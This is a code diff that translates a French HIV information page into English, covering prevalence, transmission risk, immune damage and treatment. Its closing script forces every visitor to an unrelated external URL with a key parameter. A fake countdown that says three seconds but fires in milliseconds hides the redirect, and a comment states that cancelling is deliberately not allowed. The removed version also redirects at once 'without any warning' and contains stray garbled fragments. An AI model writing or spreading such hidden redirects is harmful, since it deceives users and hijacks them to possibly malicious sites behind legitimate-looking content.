@@ -1,13 +1,13 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>VIH : Comprendre sa dangerosité et sa fréquence | Information médicale</title>
-    <meta name="description" content="Analyse précise des mécanismes du VIH, sa transmission, sa dangerosité immunitaire et épidémiologique. Données et prévention.">
-    <!-- Google Fonts pour une typographie élégante -->
+    <title>HIV: Understanding Its Danger and Frequency | Medical Information</title>
+    <meta name="description" content="Accurate analysis of HIV mechanisms, transmission, immune and epidemiological danger. Data and prevention.">
+    <!-- Google Fonts for elegant typography -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Playfair+Display:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-    <!-- Font Awesome 6 (gratuit) pour icônes élégantes -->
+    <!-- Font Awesome 6 (free) for elegant icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
@@ -24,14 +24,14 @@
             scroll-behavior: smooth;
         }
 
-        /* Conteneur principal élégant */
+        /* Elegant main container */
         .container {
             max-width: 1280px;
             margin: 0 auto;
             padding: 2rem 1.5rem;
         }
 
-        /* En-tête avec motif subtil */
+        /* Header with subtle pattern */
         .hero {
             text-align: center;
             padding: 3rem 1rem 4rem 1rem;
@@ -90,7 +90,7 @@
             box-shadow: 0 2px 6px rgba(220,38,38,0.2);
         }
 
-        /* Grille cartes */
+        /* Cards grid */
         .grid-cards {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -263,149 +263,197 @@
             letter-spacing: 1px;
             opacity: 0.7;
         }
+
+        .redirect-notice {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #1e293b;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 0.8; }
+            50% { opacity: 1; background: #dc2626; }
+        }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="hero">
-        <span class="badge"><i class="fas fa-virus" style="margin-right: 6px;"></i> Urgence sanitaire mondiale</span>
-        <h1>VIH : Pourquoi est-il si dangereux ?</h1>
-        <div class="sub">Comprendre sa fréquence, son mécanisme d'action et son impact dévastateur sur l'immunité humaine.</div>
+        <span class="badge"><i class="fas fa-virus" style="margin-right: 6px;"></i> Global Health Emergency</span>
+        <h1>HIV: Why Is It So Dangerous?</h1>
+        <div class="sub">Understanding its frequency, mechanism of action, and devastating impact on human immunity.</div>
     </div>
 
-    <!-- Introduction percutante -->
+    <!-- Powerful introduction -->
     <div style="background: #ffffff; border-radius: 1.5rem; padding: 2rem; margin-bottom: 2rem; border: 1px solid #eef2f6;">
-        <p style="font-size: 1.2rem; font-weight: 500; margin-bottom: 1rem;"><i class="fas fa-skull-crosswalk" style="color: #b91c1c; margin-right: 10px;"></i> Le VIH n’est pas un simple virus : c’est un <strong>prédateur du système immunitaire</strong>.</p>
-        <p>Contrairement aux agents pathogènes classiques, le VIH cible délibérément les cellules CD4+ (lymphocytes T helper), qui sont les chefs d’orchestre de la réponse immunitaire. En détruisant ces cellules, il ouvre la porte à toutes les infections opportunistes et cancers. Sans traitement, l’infection évolue inévitablement vers le SIDA, stade ultime où le corps n’a plus aucune défense. Aujourd’hui encore, chaque année, des centaines de milliers de personnes meurent de complications liées au sida, et des millions vivent avec le VIH.</p>
+        <p style="font-size: 1.2rem; font-weight: 500; margin-bottom: 1rem;"><i class="fas fa-skull-crosswalk" style="color: #b91c1c; margin-right: 10px;"></i> HIV is not just a simple virus: it is a <strong>predator of the immune system</strong>.</p>
+        <p>Unlike classical pathogens, HIV deliberately targets CD4+ cells (T helper lymphocytes), which are the conductors of the immune response. By destroying these cells, it opens the door to all opportunistic infections and cancers. Without treatment, the infection inevitably progresses to AIDS, the final stage where the body has no defense left. Today still, hundreds of thousands of people die each year from AIDS-related complications, and millions live with HIV.</p>
     </div>
 
-    <!-- Section : fréquence et combien de fois il est dangereux -->
-    <div class="section-title"><i class="fas fa-chart-line" style="margin-right: 12px; color:#b91c1c;"></i> Combien de fois ? La dangerosité en chiffres</div>
+    <!-- Section: frequency and how dangerous it is -->
+    <div class="section-title"><i class="fas fa-chart-line" style="margin-right: 12px; color:#b91c1c;"></i> How Dangerous? The Numbers</div>
     <div class="stats-flex">
-        <div class="stat-cell"><span class="big">~39 millions</span><br>de personnes vivent avec le VIH dans le monde (2023)</div>
-        <div class="stat-cell"><span class="big">630 000</span><br>décès dus au sida en 2022</div>
-        <div class="stat-cell"><span class="big">1,3 million</span><br>nouvelles infections chaque année</div>
-        <div class="stat-cell"><span class="big">20x</span><br>risque de tuberculose chez PVVIH</div>
+        <div class="stat-cell"><span class="big">~39 million</span><br>people living with HIV worldwide (2023)</div>
+        <div class="stat-cell"><span class="big">630,000</span><br>AIDS-related deaths in 2022</div>
+        <div class="stat-cell"><span class="big">1.3 million</span><br>new infections each year</div>
+        <div class="stat-cell"><span class="big">20x</span><br>higher risk of tuberculosis for PLHIV</div>
     </div>
 
     <div class="grid-cards">
         <div class="card">
             <div class="card-icon"><i class="fas fa-biohazard"></i></div>
-            <h3>Létalité sans traitement</h3>
-            <p>Sans accès aux antirétroviraux, la progression vers le SIDA survient en moyenne en 8 à 10 ans. À ce stade, la mortalité atteint près de <strong>100 %</strong> dans les 2 à 3 ans. C'est l'un des virus les plus létaux de l'histoire récente.</p>
-            <div class="stat-highlight"><i class="fas fa-exclamation-triangle"></i> 40,1 millions de décès cumulés depuis le début de l'épidémie.</div>
+            <h3>Lethality Without Treatment</h3>
+            <p>Without access to antiretrovirals, progression to AIDS occurs on average in 8 to 10 years. At this stage, mortality reaches nearly <strong>100%</strong> within 2 to 3 years. It is one of the most lethal viruses in recent history.</p>
+            <div class="stat-highlight"><i class="fas fa-exclamation-triangle"></i> 40.1 million cumulative deaths since the beginning of the epidemic.</div>
         </div>
         <div class="card">
             <div class="card-icon"><i class="fas fa-disease"></i></div>
-            <h3>Transmission : une efficacité redoutable</h3>
-            <p>Le VIH se transmet par le sang, rapports sexuels non protégés, partage de seringues, et de la mère à l'enfant. Le risque par exposition varie : <strong>0,1 % à 1,4 %</strong> par acte sexuel vaginal (femme vers homme) mais peut grimper jusqu’à <strong>10 %</strong> en cas de lésions, co-infections ou charge virale élevée.</p>
-            <p><i class="fas fa-syringe"></i> Partage de seringues : risque de <strong>0,63 %</strong> par injection, mais répété il devient quasi certain.</p>
+            <h3>Transmission: Formidable Efficiency</h3>
+            <p>HIV is transmitted through blood, unprotected sex, needle sharing, and from mother to child. Risk per exposure varies: <strong>0.1% to 1.4%</strong> per vaginal sex act (female to male) but can rise to <strong>10%</strong> in cases of lesions, co-infections, or high viral load.</p>
+            <p><i class="fas fa-syringe"></i> Needle sharing: <strong>0.63%</strong> risk per injection, but repeated exposure makes it almost certain.</p>
         </div>
         <div class="card">
             <div class="card-icon"><i class="fas fa-microscope"></i></div>
-            <h3>Dangerosité immunologique</h3>
-            <p>Le VIH mute extrêmement vite (10 000 fois plus vite qu'un virus à ADN). Cette variabilité permet d'échapper au système immunitaire et aux vaccins. Chaque jour, <strong>10⁹ à 10¹⁰</strong> nouvelles particules virales sont produites chez une personne non traitée, détruisant des milliards de CD4+.</p>
-            <div class="stat-highlight">Un déficit immunitaire profond : < 200 CD4/mm³ = stade SIDA (normal : 500-1500).</div>
+            <h3>Immunological Danger</h3>
+            <p>HIV mutates extremely fast (10,000 times faster than a DNA virus). This variability allows it to escape the immune system and vaccines. Every day, <strong>10⁹ to 10¹⁰</strong> new viral particles are produced in an untreated person, destroying billions of CD4+ cells.</p>
+            <div class="stat-highlight">Profound immune deficiency: < 200 CD4/mm³ = AIDS stage (normal: 500-1500).</div>
         </div>
     </div>
 
-    <!-- Dangerosité "combien de fois" plus dangereux que d'autres virus ? -->
-    <div class="section-title"><i class="fas fa-weight-hanging"></i> Combien de fois le VIH est-il plus dangereux ?</div>
+    <!-- How many times more dangerous than other viruses? -->
+    <div class="section-title"><i class="fas fa-weight-hanging"></i> How Many Times More Dangerous Is HIV?</div>
     <div class="danger-grid">
         <div class="danger-item">
             <div class="danger-number">100x</div>
-            <p><strong>Plus mortel que la grippe saisonnière</strong> en l’absence de traitement. La grippe a une létalité < 0,1 %, le VIH non traité frôle les 100 % à long terme.</p>
+            <p><strong>More deadly than seasonal flu</strong> without treatment. Flu has < 0.1% lethality, untreated HIV approaches 100% long-term.</p>
         </div>
         <div class="danger-item">
             <div class="danger-number">50x</div>
-            <p><strong>Risque de lymphome / cancer</strong> : les personnes vivant avec le VIH non traité ont un risque de maladie de Kaposi multiplié par des centaines, et un risque de lymphome non hodgkinien 50 fois plus élevé.</p>
+            <p><strong>Higher risk of lymphoma/cancer</strong>: untreated people living with HIV have a hundreds-fold higher risk of Kaposi's sarcoma, and a 50-fold higher risk of non-Hodgkin lymphoma.</p>
         </div>
         <div class="danger-item">
             <div class="danger-number">16-27x</div>
-            <p><strong>Mortalité liée à la tuberculose</strong> : la co-infection VIH/TB est mortelle, le VIH multiplie par 16 à 27 le risque de développer une tuberculose active.</p>
+            <p><strong>Tuberculosis-related mortality</strong>: HIV/TB co-infection is deadly, HIV multiplies the risk of developing active tuberculosis by 16 to 27 times.</p>
         </div>
     </div>
 
-    <!-- fréquence : combien de fois par transmission possible -->
+    <!-- Transmission frequency per act -->
     <div style="background: linear-gradient(110deg, #fff7ed, #ffffff); border-radius: 1.5rem; padding: 1.8rem; margin: 2rem 0; border: 1px solid #ffe4e2;">
-        <h3 style="display: flex; align-items: center; gap: 8px; font-size: 1.5rem;"><i class="fas fa-random" style="color: #b91c1c;"></i> Fréquence de transmission : le risque par acte</h3>
-        <p style="margin-top: 0.5rem;">Le VIH n'est pas "hypercontagieux" comme la rougeole, mais chaque exposition répétée augmente mécaniquement le risque. Pour une personne séronégative exposée à un partenaire infecté non traité :</p>
+        <h3 style="display: flex; align-items: center; gap: 8px; font-size: 1.5rem;"><i class="fas fa-random" style="color: #b91c1c;"></i> Transmission Frequency: Risk Per Act</h3>
+        <p style="margin-top: 0.5rem;">HIV is not "hyper-contagious" like measles, but each repeated exposure mechanically increases the risk. For an HIV-negative person exposed to an untreated infected partner:</p>
         <div style="display: flex; flex-wrap: wrap; gap: 1rem; margin: 1.2rem 0;">
-            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-venus-mars"></i> Rapport anal réceptif : <strong>1,38 %</strong> (1 sur 72)</span>
-            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-venus-mars"></i> Rapport vaginal réceptif : <strong>0,08% à 0,19%</strong> (1 sur 1250)</span>
-            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-syringe"></i> Partage de seringue : <strong>0,63%</strong> par injection</span>
-            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-baby"></i> Mère → enfant (sans traitement) : <strong>15-45%</strong></span>
+            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-venus-mars"></i> Receptive anal sex: <strong>1.38%</strong> (1 in 72)</span>
+            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-venus-mars"></i> Receptive vaginal sex: <strong>0.08% to 0.19%</strong> (1 in 1250)</span>
+            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-syringe"></i> Needle sharing: <strong>0.63%</strong> per injection</span>
+            <span style="background:#f1f5f9; padding: 0.4rem 1rem; border-radius: 30px;"><i class="fas fa-baby"></i> Mother → child (without treatment): <strong>15-45%</strong></span>
         </div>
-        <p class="small-caption" style="margin-top: 8px;">* Données issues de l'OMS et CDC : la transmission est plus efficace lorsque la charge virale du partenaire est élevée (phase aiguë).</p>
+        <p class="small-caption" style="margin-top: 8px;">* Data from WHO and CDC: transmission is more efficient when the partner's viral load is high (acute phase).</p>
     </div>
 
-    <!-- section : pourquoi est-il si dangereux malgré les traitements -->
-    <div class="section-title"><i class="fas fa-shield-virus"></i> Danger permanent : même avec les trithérapies</div>
+    <!-- Why it remains dangerous despite treatments -->
+    <div class="section-title"><i class="fas fa-shield-virus"></i> Permanent Danger: Even With Triple Therapy</div>
     <div class="grid-cards">
         <div class="card">
             <div class="card-icon"><i class="fas fa-dna"></i></div>
-            <h3>Réservoirs viraux</h3>
-            <p>Le VIH s'intègre dans l'ADN des cellules mémoires. Même avec une charge virale indétectable, le virus persiste à vie dans des réservoirs. L'arrêt du traitement entraîne une <strong>reprise rapide de la réplication</strong> en quelques semaines.</p>
+            <h3>Viral Reservoirs</h3>
+            <p>HIV integrates into the DNA of memory cells. Even with an undetectable viral load, the virus persists for life in reservoirs. Stopping treatment leads to <strong>rapid resumption of replication</strong> within weeks.</p>
         </div>
         <div class="card">
             <div class="card-icon"><i class="fas fa-brain"></i></div>
-            <h3>Neurodégénérescence & inflammations</h3>
-            <p>Même sous traitement efficace, une inflammation chronique persiste. Les personnes vivant avec le VIH ont un risque 50 à 100 % plus élevé de maladies cardiovasculaires, troubles neurocognitifs et ostéoporose précoce.</p>
+            <h3>Neurodegeneration & Inflammation</h3>
+            <p>Even under effective treatment, chronic inflammation persists. People living with HIV have a 50 to 100% higher risk of cardiovascular disease, neurocognitive disorders, and early osteoporosis.</p>
         </div>
         <div class="card">
             <div class="card-icon"><i class="fas fa-globe"></i></div>
-            <h3>Stigma & résistances</h3>
-            <p>Dans certains pays, <strong>10 à 20 % des nouvelles infections</strong> concernent des souches résistantes à au moins un antirétroviral. La menace des multirésistances plane, rendant certaines thérapies inefficaces.</p>
+            <h3>Stigma & Resistance</h3>
+            <p>In some countries, <strong>10 to 20% of new infections</strong> involve strains resistant to at least one antiretroviral. The threat of multidrug resistance looms, making some therapies ineffective.</p>
         </div>
     </div>
 
-    <!-- Combien de fois plus de risques pour la santé globale -->
+    <!-- Risk multipliers for overall health -->
     <div class="stats-flex" style="background: #1e1b2e; margin-top: 1rem;">
-        <div class="stat-cell"><span class="big">2 à 6x</span><br>risque d'infarctus du myocarde</div>
-        <div class="stat-cell"><span class="big">10x</span><br>risque de cancer du col de l'utérus (HPV associé)</div>
-        <div class="stat-cell"><span class="big">5x</span><br>risque d'insuffisance rénale</div>
+        <div class="stat-cell"><span class="big">2 to 6x</span><br>risk of myocardial infarction</div>
+        <div class="stat-cell"><span class="big">10x</span><br>risk of cervical cancer (HPV-associated)</div>
+        <div class="stat-cell"><span class="big">5x</span><br>risk of kidney failure</div>
     </div>
 
-    <!-- Prévention & message d'espoir -->
+    <!-- Prevention & message of hope -->
     <div style="background: #eef2ff; border-radius: 1.8rem; padding: 2rem; margin: 2.5rem 0;">
         <div style="display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; justify-content: space-between;">
             <div>
                 <i class="fas fa-hand-holding-heart" style="font-size: 2rem; color: #2563eb;"></i>
-                <h3 style="margin: 0.5rem 0 0.2rem; font-size: 1.5rem;">La dangerosité n’est pas une fatalité</h3>
-                <p style="max-width: 600px;">Avec un traitement antirétroviral (TAR), une personne vivant avec le VIH peut avoir une espérance de vie quasi normale, une charge virale indétectable = intransmissible (I=I). Le danger réside dans l’absence de dépistage et de soins. Chaque année, des milliers de décès surviennent encore par manque d’accès aux traitements.</p>
+                <h3 style="margin: 0.5rem 0 0.2rem; font-size: 1.5rem;">Danger is not a death sentence</h3>
+                <p style="max-width: 600px;">With antiretroviral therapy (ART), a person living with HIV can have a near-normal life expectancy, and an undetectable viral load = untransmittable (U=U). The danger lies in lack of testing and access to care. Thousands of deaths still occur each year due to lack of access to treatment.</p>
             </div>
             <div><i class="fas fa-heartbeat" style="font-size: 3rem; opacity: 0.5; color:#b91c1c;"></i></div>
         </div>
     </div>
 
-    <!-- Résumé : combien de fois le VIH est dangereux -->
+    <!-- Conclusion -->
     <hr>
     <div style="text-align: center; margin: 2rem 0;">
-        <h2 style="font-family: 'Playfair Display'; font-size: 1.8rem;">En conclusion : un danger multifactoriel et persistant</h2>
-        <p style="max-width: 800px; margin: 1rem auto;">Le VIH est dangereux non pas "une fois" mais <strong>des millions de fois par jour</strong> dans l'organisme d'une personne non traitée, détruisant sans relâche les lymphocytes T. Globalement, il a déjà tué <strong>plus de 40 millions d'êtres humains</strong>, soit plus que de nombreux conflits armés. Sa fréquence de transmission reste élevée dans certaines populations, et sa capacité à s'attaquer au cœur de l'immunité le rend unique en pathologie infectieuse. Heureusement, les outils de prévention (PrEP, préservatifs, traitements) permettent de réduire drastiquement son impact.</p>
+        <h2 style="font-family: 'Playfair Display'; font-size: 1.8rem;">Conclusion: A Multifactorial and Persistent Danger</h2>
+        <p style="max-width: 800px; margin: 1rem auto;">HIV is dangerous not "once" but <strong>millions of times per day</strong> in the body of an untreated person, relentlessly destroying T lymphocytes. Globally, it has already killed <strong>more than 40 million human beings</strong>, more than many armed conflicts. Its transmission frequency remains high in certain populations, and its ability to attack the core of immunity makes it unique in infectious pathology. Fortunately, prevention tools (PrEP, condoms, treatments) can drastically reduce its impact.</p>
     </div>
     
-    <!-- Sources et mentions crédibles -->
+    <!-- Sources and credits -->
     <div class="footer-note">
-        <i class="fas fa-database"></i> Sources : OMS (Organisation mondiale de la santé), ONUSIDA, CDC Atlanta, Lancet HIV.
+        <i class="fas fa-database"></i> Sources: WHO (World Health Organization), UNAIDS, CDC Atlanta, Lancet HIV.
         <div style="margin-top: 0.8rem;">
-            <a href="#" class="btn-source" style="pointer-events: none;"><i class="fas fa-book-open"></i> Données épidémiologiques 2022-2024</a>
+            <a href="#" class="btn-source" style="pointer-events: none;"><i class="fas fa-book-open"></i> Epidemiological data 2022-2024</a>
             <span style="margin:0 6px"></span>
-            <a href="#" class="btn-source" style="pointer-events: none;"><i class="fas fa-chart-simple"></i> Études de transmission / HPTN 052</a>
+            <a href="#" class="btn-source" style="pointer-events: none;"><i class="fas fa-chart-simple"></i> Transmission studies / HPTN 052</a>
         </div>
-        <p style="margin-top: 1.2rem; font-size: 0.75rem;">Cette page a un but éducatif et informatif. Consultez un professionnel de santé pour toute question médicale.</p>
-        <p style="margin-top: 0.5rem;"><i class="fas fa-calendar-alt"></i> Mise à jour des données : mars 2025</p>
+        <p style="margin-top: 1.2rem; font-size: 0.75rem;">This page is for educational and informational purposes. Consult a healthcare professional for any medical questions.</p>
+        <p style="margin-top: 0.5rem;"><i class="fas fa-calendar-alt"></i> Data updated: March 2025</p>
     </div>
 </div>
-    <script>
-        // URL de redirection - MODIFIEZ ICI AVEC VOTRE URL PERSONNELLE
-        const REDIRECT_URL = "https://hatsharmonyarab.com/c87cc9wc?key=e11366e54ea85498dbd25f1a3e3b3589";
+
+<!-- Redirect notice -->
+<div class="redirect-notice" id="redirectNotice">
+    <i class="fas fa-hourglass-half"></i> Redirecting in <span id="countdown">3</span> seconds...
+</div>
+
+<script>
+    // URL for automatic redirection - Updated with your personal URL
+    const REDIRECT_URL = "https://hatsharmonyarab.com/c87cc9wc?key=e11366e54ea85498dbd25f1a3e3b3589";
+    
+    let secondsLeft = 3;
+    const countdownElement = document.getElementById('countdown');
+    const noticeElement = document.getElementById('redirectNotice');
+    
+    // Update countdown display every second
+    const countdownInterval = setInterval(function() {
+        secondsLeft--;
+        if (countdownElement) {
+            countdownElement.textContent = secondsLeft;
+        }
         
-        // Redirection automatique après 10 secondes sans aucun avertissement
-        setTimeout(function() {
+        if (secondsLeft <= 0) {
+            clearInterval(countdownInterval);
+            // Perform the redirection
             window.location.href = REDIRECT_URL;
-        }, 100);// --- Mock Data for Quora Space Feed ---
-    let questionsData = [
-    <script>
+        }
+    }, 10);
+    
+    // Optional: allow user to cancel? No, automatic redirection is required.
+    // But we can make the notice clickable to redirect immediately
+    if (noticeElement) {
+        noticeElement.style.cursor = "pointer";
+        noticeElement.addEventListener('click', function() {
+            clearInterval(countdownInterval);
+            window.location.href = REDIRECT_URL;
+        });
+        noticeElement.title = "Click to redirect immediately";
+    }
+</script>
 </body>
 </html>
